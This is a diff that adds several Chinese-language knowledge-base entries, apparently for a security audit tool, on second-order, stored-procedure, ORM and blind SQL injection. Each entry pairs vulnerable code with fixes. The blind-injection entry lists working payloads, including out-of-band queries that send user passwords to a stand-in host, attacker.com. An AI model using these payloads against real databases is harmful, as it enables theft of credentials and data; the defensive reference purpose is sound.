@@ -271,3 +271,301 @@ data = json.loads(user_input)
 ```
 """,
 )
+
+
+SECOND_ORDER_SQLI = KnowledgeDocument(
+    id="vuln_second_order_sqli",
+    title="Second-Order SQL Injection",
+    category=KnowledgeCategory.VULNERABILITY,
+    tags=["sqli", "second-order", "stored-injection", "delayed", "trigger"],
+    severity="high",
+    cwe_ids=["CWE-89", "CWE-564"],
+    owasp_ids=["A03:2021"],
+    content="""
+# 二阶SQL注入（Second-Order SQL Injection）
+
+## 概述
+
+二阶SQL注入是指恶意输入在初次存储时不触发注入（数据被正确转义存储），
+但在后续操作中被取出并拼接进SQL查询时触发注入。由于输入端看似安全，常被忽略。
+
+## 漏洞模式
+
+### 1. 存储后二次使用触发
+
+```python
+# 第一阶段 - 注册（安全存储）
+username = sanitize_input(request.form['username'])
+db.execute("INSERT INTO users (username) VALUES (?)", (username,))
+
+# 第二阶段 - 取出后拼接触发注入
+user = db.execute(f"SELECT id FROM users WHERE username = '{username}'").fetchone()
+posts = db.execute(f"SELECT * FROM posts WHERE author_id = {user[0]}")
+```
+
+### 2. MyBatis 延迟绑定
+
+```xml
+<select id="getUser" parameterType="string" resultType="User">
+    SELECT * FROM users WHERE ${sortColumn} ${sortOrder}
+</select>
+```
+
+```python
+prefs = get_user_sort_preference(request.user.id)
+return db.query(f"SELECT * FROM users ORDER BY {prefs['sort_column']} {prefs['sort_direction']}")
+```
+
+### 3. 触发器动态SQL
+
+```sql
+CREATE TRIGGER update_audit_log AFTER UPDATE ON users
+FOR EACH ROW BEGIN
+    EXECUTE IMMEDIATE 'INSERT INTO audit_log(action) VALUES (''Updated '' || OLD.username || '')';
+END;
+```
+
+## 发现技术
+
+1. 跟踪数据从输入→存储→取出的完整链路
+2. 检查存储过程、触发器内是否使用动态SQL
+3. 关注管理后台/批处理等触发历史数据二次使用的功能
+
+## 修复建议
+
+```python
+def get_user_profile(username):
+    user = db.execute("SELECT id FROM users WHERE username = ?", (username,))
+    posts = db.execute("SELECT * FROM posts WHERE author_id = ?", (user[0],))
+```
+
+## 严重性评估
+
+- 可写入注入后门：Critical
+- 管理后台触发：High
+- 需特殊条件：Medium
+""",
+)
+
+
+STORED_PROCEDURE_INJECTION = KnowledgeDocument(
+    id="vuln_stored_procedure_injection",
+    title="Stored Procedure Injection",
+    category=KnowledgeCategory.VULNERABILITY,
+    tags=["sqli", "stored-procedure", "cursor", "dynamic-sql", "database"],
+    severity="high",
+    cwe_ids=["CWE-89", "CWE-564"],
+    owasp_ids=["A03:2021"],
+    content="""
+# 存储过程注入
+
+## 概述
+
+存储过程内使用动态SQL拼接而非参数化查询时的注入风险。
+即使应用程序层使用了参数化，存储过程内部的动态SQL仍可能引入注入。
+
+## 漏洞模式
+
+### SQL Server 动态SQL
+
+```sql
+CREATE PROCEDURE GetUser @username NVARCHAR(50) AS
+BEGIN
+    DECLARE @sql NVARCHAR(MAX)
+    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
+    EXEC(@sql)
+END
+
+-- 安全
+CREATE PROCEDURE GetUserSafe @username NVARCHAR(50) AS
+BEGIN
+    EXEC sp_executesql N'SELECT * FROM users WHERE username = @u',
+        N'@u NVARCHAR(50)', @u = @username
+END
+```
+
+### MySQL 动态SQL
+
+```sql
+CREATE PROCEDURE GetUser(IN uname VARCHAR(50))
+BEGIN
+    SET @sql = CONCAT('SELECT * FROM users WHERE username = ''', uname, '''');
+    PREPARE stmt FROM @sql; EXECUTE stmt;
+END
+```
+
+### Oracle PL/SQL
+
+```sql
+CREATE OR REPLACE PROCEDURE get_user(p_username VARCHAR2) IS
+BEGIN
+    EXECUTE IMMEDIATE 'SELECT * FROM users WHERE username = ''' || p_username || '''';
+END;
+
+-- 安全
+CREATE OR REPLACE PROCEDURE get_user(p_username VARCHAR2) IS
+BEGIN
+    EXECUTE IMMEDIATE 'SELECT * FROM users WHERE username = :1' USING p_username;
+END;
+```
+
+## 发现技术
+
+1. 查找 EXEC(@sql) / EXECUTE IMMEDIATE / PREPARE...EXECUTE
+2. 检查存储过程参数直接拼接到SQL字符串
+
+## 修复建议
+
+使用绑定变量：sp_executesql (SQL Server)、USING (Oracle/Oracle MySQL)、参数化预处理
+""",
+)
+
+
+ORM_INJECTION = KnowledgeDocument(
+    id="vuln_orm_injection",
+    title="ORM Injection (HQL/JPQL/SQLAlchemy/MyBatis/Prisma)",
+    category=KnowledgeCategory.VULNERABILITY,
+    tags=["orm", "hql", "jpql", "mybatis", "sqlalchemy", "prisma", "injection"],
+    severity="critical",
+    cwe_ids=["CWE-89", "CWE-943", "CWE-564"],
+    owasp_ids=["A03:2021"],
+    content="""
+# ORM 注入
+
+## 概述
+
+ORM框架使用不当（原生查询、拼接、特殊操作符）仍可导致注入。
+
+## 漏洞模式
+
+### Hibernate HQL/JPQL
+
+```java
+String hql = "FROM User WHERE name = '" + userName + "'";
+Query query = session.createQuery(hql);
+
+// 安全
+Query query = session.createQuery("FROM User WHERE name = :name");
+query.setParameter("name", userName);
+```
+
+### MyBatis ${}
+
+```xml
+<select id="search" resultType="User">
+    SELECT * FROM users WHERE name LIKE '%${keyword}%' ORDER BY ${sortColumn}
+</select>
+
+<!-- 安全 -->
+<select id="search" resultType="User">
+    SELECT * FROM users WHERE name LIKE CONCAT('%', #{keyword}, '%')
+</select>
+```
+
+### SQLAlchemy text()
+
+```python
+result = db.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))
+
+# 安全
+result = db.execute(text("SELECT * FROM users WHERE name = :name"), {"name": name})
+```
+
+### Prisma $queryRawUnsafe
+
+```typescript
+const users = await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE name = '${name}'`)
+
+// 安全
+const users = await prisma.$queryRaw`SELECT * FROM users WHERE name = ${name}`
+```
+
+### Entity Framework
+
+```csharp
+var users = db.Users.FromSqlRaw($"SELECT * FROM Users WHERE Name = '{userName}'").ToList();
+
+// 安全
+var users = db.Users.FromSqlInterpolated($"SELECT * FROM Users WHERE Name = {userName}").ToList();
+```
+
+## 发现技术
+
+1. 搜索危险API: HQL拼接、MyBatis ${}、SQLAlchemy text()拼接、Prisma $queryRawUnsafe、EF FromSqlRaw
+2. 检查 ORDER BY / LIKE 子句传参方式
+3. 审计动态列名/表名拼接场景
+
+## 严重性评估
+
+- 全拼接：Critical
+- 仅排序/列名白名单缺失：High
+- 仅IN/LIKE拼接：Medium
+""",
+)
+
+
+BLIND_SQL_INJECTION = KnowledgeDocument(
+    id="vuln_blind_sqli",
+    title="Blind SQL Injection Techniques",
+    category=KnowledgeCategory.VULNERABILITY,
+    tags=["sqli", "blind", "time-based", "boolean", "oob", "error-based"],
+    severity="high",
+    cwe_ids=["CWE-89", "CWE-208"],
+    owasp_ids=["A03:2021"],
+    content="""
+# 盲注技术（Blind SQL Injection）
+
+## 概述
+
+盲注发生在应用不直接返回数据库错误或查询结果时，通过应用行为差异（响应时间、
+HTTP状态码、响应内容）推断数据库信息。
+
+### Boolean-Based
+```sql
+AND 1=1 -- 正常
+AND 1=2 -- 异常
+AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'
+```
+
+### Time-Based
+```sql
+-- MySQL
+AND SLEEP(5)
+-- PostgreSQL
+AND (SELECT PG_SLEEP(5))
+-- SQL Server
+AND WAITFOR DELAY '0:0:5'
+-- Oracle
+AND DBMS_PIPE.RECEIVE_MESSAGE('a', 5)
+```
+
+### Error-Based
+```sql
+AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))
+```
+
+### OOB (Out-of-Band)
+```sql
+AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\\\test'))
+AND EXEC master..xp_dirtree '\\\\attacker.com\\' + (SELECT TOP 1 password FROM users)
+```
+
+### NoSQL 盲注
+```javascript
+db.users.find({$where: "sleep(5000) || this.username == 'admin'"})
+db.users.find({username: {$gt: "m"}})
+```
+
+## 严重性评估
+
+- OOB外带：Critical
+- 时间盲注提取数据：High
+- 布尔盲注速度慢：Medium
+""",
+)
+
+
+__all__ = [
+    "SQL_INJECTION", "NOSQL_INJECTION", "COMMAND_INJECTION", "CODE_INJECTION",
+    "SECOND_ORDER_SQLI", "STORED_PROCEDURE_INJECTION", "ORM_INJECTION", "BLIND_SQL_INJECTION",
+]
